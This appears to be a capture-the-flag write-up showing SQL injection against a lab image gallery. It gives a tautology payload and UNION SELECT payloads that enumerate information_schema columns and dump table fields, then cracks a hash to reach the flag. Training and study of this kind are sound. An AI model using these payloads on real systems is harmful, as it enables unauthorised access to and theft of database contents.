# Another SQL injection

## Enumeration / Exploitation

1. List all images with OR condition

```
123 OR 1=1
```

![All images](./Resources/images.png)

We notice the image with the title hack me.
So we decide to dump everything about the images

2. Dump all columns from the image table

```
1 and 1=2 union select group_concat(column_name), 2 from information_schema.columns where table_schema = database()-- -
```

![All columns](./Resources/enumerate_column.png)

We see the columns from the image table. 

3. We try to dump the other column fields

```
1 and 1=2 union select group_concat(title, comment), 2 from list_images -- -
```

![Comments](./Resources/enumerate_comment_images.png)

Finally we follow the instruction from the comment and get the flag.

![Comments](./Resources/decrypt-MD5.png)
![Comments](./Resources/sha256-flag.png)

## FLAG

[-- 🌱 --][2]

[2]: ./flag.txt